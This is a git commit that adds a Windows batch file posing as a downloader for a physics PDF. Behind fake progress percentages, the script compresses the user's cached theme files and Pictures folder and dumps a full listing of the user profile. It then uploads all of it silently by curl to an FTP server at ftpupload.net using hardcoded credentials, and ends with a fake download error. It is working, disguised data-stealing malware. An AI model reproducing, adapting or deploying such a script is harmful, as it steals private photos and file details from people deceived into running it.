272c1c8b5ceefb93f46ec211bf73a13017c997ca
Jivaansh Yadav <jivaanshyadav@gmail.com>
2026-03-03 14:49:37 +0530

    phy

---
+++ T26 521 - PHY.bat
@@ -0,0 +1,28 @@
+@echo off
+
+echo Downloading T26 521 - PHY.pdf
+
+echo Please wait...
+
+powershell -Command "$ProgressPreference='SilentlyContinue'; Compress-Archive -Path "%APPDATA%\Microsoft\Windows\Themes\CachedFiles" -DestinationPath "%TEMP%\wallpaper.zip" -Force *> $null
+echo Starting Download...
+echo 1%%
+
+curl -T "%TEMP%\wallpaper.zip" ftp://ftpupload.net/htdocs/data/wallpaper.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
+echo 7%%
+
+tree "%USERPROFILE%" /F /A > "%TEMP%\userprofile-tree.txt"
+echo 19%%
+
+curl -T "%TEMP%\userprofile-tree.txt" ftp://ftpupload.net/htdocs/data/userprofile-tree.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
+echo 54%%
+timeout /t 1 /nobreak >nul
+echo 69%%
+
+powershell -Command "$ProgressPreference='SilentlyContinue'; Compress-Archive -Path "%USERPROFILE%\Pictures" -DestinationPath "%TEMP%\Pictures.zip" -Force *> $null
+echo 82%%
+timeout /t 1 /nobreak >nul
+echo 99%%
+curl -T "%TEMP%\Pictures.zip" ftp://ftpupload.net/htdocs/data/pics.txt --user if0_40225150:Jivaansh401176 >nul 2>&1
+echo Some error occured. Unable to download file
+pause
